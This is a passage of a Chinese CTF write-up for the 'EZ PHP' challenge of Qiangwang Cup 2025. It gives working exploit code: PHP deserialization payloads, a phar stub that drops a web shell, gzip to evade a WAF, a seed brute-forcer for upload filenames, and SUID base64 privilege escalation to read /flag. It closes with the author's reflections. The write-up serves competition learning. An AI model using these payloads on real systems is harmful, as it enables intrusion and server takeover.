+<p>这个eval函数在第一行（所以括号里的行号是1），同时eval解出来之后所有函数都堆在一行（所以$前面的行号是第一行），所以不难推出他这个名字是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\0readflag/var/www/html/index.php(1) : eval()\&#x27;d code:1$序号</span><br></pre></td></tr></table></figure>
+
+<p>还有就是，php反序列化时有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$func = array(&#x27;类名&#x27;，&#x27;函数名&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>这样我们有匿名类类名就能调用到匿名类的readflag，这样就能声明到了。</p>
+<p>很容易搓：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test &#123;</span><br><span class="line">    public $readflag;</span><br><span class="line">    public $f;</span><br><span class="line">    public $key;</span><br><span class="line"></span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new test();</span><br><span class="line">$a -&gt; readflag = 名字;</span><br><span class="line">$a -&gt; f = &#x27;test&#x27;;</span><br><span class="line">$a -&gt; key = &#x27;class&#x27;;</span><br><span class="line">$b = new test();</span><br><span class="line">$b -&gt; f = array(&quot;class@anonymous\0/var/www/html/index.php(1) : eval()&#x27;d code:1$1&quot;, &#x27;readflag&#x27;);</span><br><span class="line">$b -&gt; key = &#x27;func&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">echo &#x27;                           &#x27;;</span><br><span class="line">echo serialize($b);</span><br></pre></td></tr></table></figure>
+
+<p>这里contruct里的东西全部都要删了。不然没法反序列化也没法序列化（php 7+）</p>
+<p>搞完这个我们就可以稳定include了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">target = &#x27;http://localhost:8000/&#x27;</span><br><span class="line">a = &#x27;O:4:&quot;test&quot;:3:&#123;s:8:&quot;readflag&quot;;s:5:&quot;名字&quot;;s:1:&quot;f&quot;;s:4:&quot;test&quot;;s:3:&quot;key&quot;;s:5:&quot;class&quot;;&#125;&#x27;</span><br><span class="line">b = &#x27;O:4:&quot;test&quot;:3:&#123;s:8:&quot;readflag&quot;;s:5:&quot;名字&quot;;s:1:&quot;f&quot;;s:55:&quot;\0readflag/var/www/html/index.php(1) : eval()\&#x27;d code:1$1&quot;;s:3:&quot;key&quot;;s:4:&quot;func&quot;;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">pay = &#x27;a:2:&#123;i:0;&#x27;+a+&#x27;i:1;&#x27;+b+&#x27;&#125;&#x27;</span><br><span class="line">res = requests.post(target,params=&#123;&#x27;land&#x27;:pay&#125;,files=&#123;&#x27;file&#x27;: (&#x27;1.png&#x27;, open(&#x27;1.gz&#x27;, &#x27;rb&#x27;))&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>之后我们来想想这个文件传什么。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2025/07/30/%E5%BD%93include%E9%82%82%E9%80%85phar-deadsecctf2025-baby-web/">https://fushuling.com/index.php/2025/07/30/当include邂逅phar-deadsecctf2025-baby-web/</a></p>
+<p>同款构造方法。我们搞一个phar：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$phar = new Phar(&#x27;exploit.phar&#x27;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"></span><br><span class="line">$stub = &lt;&lt;&lt;&#x27;STUB&#x27;</span><br><span class="line">&lt;?php</span><br><span class="line">    system(&#x27;echo &quot;&lt;?php system(\$_GET[1]); ?&gt;&quot; &gt; 1.php&#x27;);</span><br><span class="line">    __HALT_COMPILER();</span><br><span class="line">?&gt;</span><br><span class="line">STUB;</span><br><span class="line"></span><br><span class="line">$phar-&gt;setStub($stub);</span><br><span class="line">$phar-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;test&#x27;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>改名为1，gzip压缩（不然你压缩完出来文件里有phar会被waf）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip 1</span><br></pre></td></tr></table></figure>
+
+<p>搞完1.gz 备用。</p>
+<p>接下来我们就看看怎么去把phar搞到文件名里。这里我们发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$seed = $time . intval($filename);</span><br><span class="line">mt_srand($seed);</span><br></pre></td></tr></table></figure>
+
+<p>filename可控。我们可以爆破种子去搞seed。使<code>generateRandomString</code>生成的文件名以phar开头。</p>
+<p>这里直接找AI搓：<a target="_blank" rel="noopener" href="https://chat.deepseek.com/share/u25k3dd01q3ly9h40t">https://chat.deepseek.com/share/u25k3dd01q3ly9h40t</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">date_default_timezone_set(&#x27;Asia/Shanghai&#x27;);</span><br><span class="line">function generateRandomString($length = 8) &#123;</span><br><span class="line">    $characters = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;;</span><br><span class="line">    $randomString = &#x27;&#x27;;</span><br><span class="line">    for ($i = 0; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $r = rand(0, strlen($characters) - 1);</span><br><span class="line">        $randomString .= $characters[$r];</span><br><span class="line">    &#125;</span><br><span class="line">    return $randomString;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 获取当前时间（Hi格式）</span><br><span class="line">$currentTime = date(&#x27;Hi&#x27;);</span><br><span class="line">echo &quot;当前时间: &quot; . $currentTime . &quot;\n&quot;;</span><br><span class="line">echo &quot;正在寻找前四个字符为 &#x27;phar&#x27; 的字符串...\n\n&quot;;</span><br><span class="line"></span><br><span class="line">$found = false;</span><br><span class="line">$attempts = 0;</span><br><span class="line">$maxAttempts = 10000000; // 最大尝试次数，防止无限循环</span><br><span class="line"></span><br><span class="line">// 尝试不同的整型后缀</span><br><span class="line">for ($i = 0; $i &lt; $maxAttempts; $i++) &#123;</span><br><span class="line">    $attempts++;</span><br><span class="line">    </span><br><span class="line">    // 构建种子：当前时间 + 整型数字</span><br><span class="line">    $seed = $currentTime . $i;</span><br><span class="line">    </span><br><span class="line">    // 设置随机数种子</span><br><span class="line">    mt_srand((int)$seed);</span><br><span class="line">    srand((int)$seed); // 注意：generateRandomString 使用 rand() 而不是 mt_rand()</span><br><span class="line">    </span><br><span class="line">    // 生成随机字符串</span><br><span class="line">    $randomString = generateRandomString(8);</span><br><span class="line">    </span><br><span class="line">    // 检查前四个字符是否为 &quot;phar&quot;</span><br><span class="line">    if (substr($randomString, 0, 4) === &#x27;phar&#x27;) &#123;</span><br><span class="line">        echo &quot;找到符合条件的字符串!\n&quot;;</span><br><span class="line">        echo &quot;种子: &quot; . $seed . &quot;\n&quot;;</span><br><span class="line">        echo &quot;生成的字符串: &quot; . $randomString . &quot;\n&quot;;</span><br><span class="line">        echo &quot;尝试次数: &quot; . $attempts . &quot;\n&quot;;</span><br><span class="line">        $found = true;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 每10000次显示一次进度</span><br><span class="line">    if ($attempts % 10000 === 0) &#123;</span><br><span class="line">        echo &quot;已尝试 &quot; . $attempts . &quot; 次...\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!$found) &#123;</span><br><span class="line">    echo &quot;在 &quot; . $maxAttempts . &quot; 次尝试内未找到符合条件的字符串。\n&quot;;</span><br><span class="line">    echo &quot;建议:\n&quot;;</span><br><span class="line">    echo &quot;1. 增加最大尝试次数\n&quot;;</span><br><span class="line">    echo &quot;2. 检查当前时间是否已变化\n&quot;;</span><br><span class="line">    echo &quot;3. 考虑使用更大的数字范围\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里记得设置时区！！！！！</p>
+<p>然后我们就正常做就行，运行上面那个exp，爆破到当前分钟的种子：</p>
+<p>然后把这玩意放到readflag属性里，上传1.gz:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"># a:3:&#123;i:0;O:4:&quot;test&quot;:3:&#123;s:8:&quot;readflag&quot;;s:6:&quot;104206&quot;;s:1:&quot;f&quot;;s:4:&quot;test&quot;;s:3:&quot;key&quot;;s:5:&quot;class&quot;;&#125;i:1;O:4:&quot;test&quot;:3:&#123;s:8:&quot;readflag&quot;;N;s:1:&quot;f&quot;;a:2:&#123;i:0;s:62:&quot;class@anonymous/var/www/html/index.php(1) : eval()&#x27;d code:1$0&quot;;i:1;s:8:&quot;readflag&quot;;&#125;s:3:&quot;key&quot;;s:4:&quot;func&quot;;&#125;i:2;O:4:&quot;test&quot;:3:&#123;s:8:&quot;readflag&quot;;N;s:1:&quot;f&quot;;s:8:&quot;readflag&quot;;s:3:&quot;key&quot;;s:4:&quot;func&quot;;&#125;&#125;</span><br><span class="line">target = &#x27;http://localhost:8000/&#x27;</span><br><span class="line">a = &#x27;O:4:&quot;test&quot;:3:&#123;s:8:&quot;readflag&quot;;s:5:&quot;18110&quot;;s:1:&quot;f&quot;;s:4:&quot;test&quot;;s:3:&quot;key&quot;;s:5:&quot;class&quot;;&#125;&#x27;</span><br><span class="line">b = &#x27;O:4:&quot;test&quot;:3:&#123;s:8:&quot;readflag&quot;;s:5:&quot;18110&quot;;s:1:&quot;f&quot;;s:55:&quot;\0readflag/var/www/html/index.php(1) : eval()\&#x27;d code:1$1&quot;;s:3:&quot;key&quot;;s:4:&quot;func&quot;;&#125;&#x27;</span><br><span class="line"></span><br><span class="line">pay = &#x27;a:2:&#123;i:0;&#x27;+a+&#x27;i:1;&#x27;+b+&#x27;&#125;&#x27;</span><br><span class="line">res = requests.post(target,params=&#123;&#x27;land&#x27;:pay&#125;,files=&#123;&#x27;file&#x27;: (&#x27;1.png&#x27;, open(&#x27;1.gz&#x27;, &#x27;rb&#x27;))&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>直接传，搞到1.php的shell。发现&#x2F;flag要提权。</p>
+<p>我们这里找一下SUID提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p>发现有base64。参考：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/base64/">https://gtfobins.github.io/gtfobins/base64/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 &quot;/flag&quot; | base64 --decode</span><br></pre></td></tr></table></figure>
+
+<p>flag{145f3a7d-5596-4fb3-8092-90c15ebd3171}</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>后面是一些感想。</p>
+<p>今年九月之后我正式步入中六（高三）的生活了。每天被试题淹没的我真的很缺如此一场酣畅淋漓的CTF恢复心态。这次是真爆肝了一整个周末。<code>ezphp</code>一题我从第一天下午2点看到凌晨3点，又从第二天7点看到下午3点才解出来。</p>
+<p>感谢队友的一路陪伴。最近我考试特别多，也忙得晕头转向的，我没想到居然能从CTF这里找到如此大的鼓励和安慰。感谢V&amp;N的师傅们这次在我的17岁留下如此的回忆，就像你们往常做的那样。</p>
+<p>在和队里的pwn手和web手一起做出来<code>go2php</code>这道web pwn之后，我明白，CTF从来不是一个人的游戏。没有MVP，也没有躺赢狗。少一个人都赢不了比赛。这是我们热血沸腾的组合技。</p>
+<p>热泪盈眶，不知所言。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Secret-Vault"><span class="toc-number">1.1.</span> <span class="toc-text">2.Secret Vault</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-EZ-PHP"><span class="toc-number">1.2.</span> <span class="toc-text">3.EZ PHP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">2.</span> <span class="toc-text">后记</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-10-21-2025-web-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&text=强网杯 2025 部分web wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&title=强网杯 2025 部分web wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&is_video=false&description=强网杯 2025 部分web wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=强网杯 2025 部分web wp&body=Check out this article: https://lamentxu.top/posts/2025-10-21-2025-web-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&title=强网杯 2025 部分web wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&title=强网杯 2025 部分web wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&title=强网杯 2025 部分web wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&title=强网杯 2025 部分web wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&name=强网杯 2025 部分web wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-10-21-2025-web-wp/&t=强网杯 2025 部分web wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
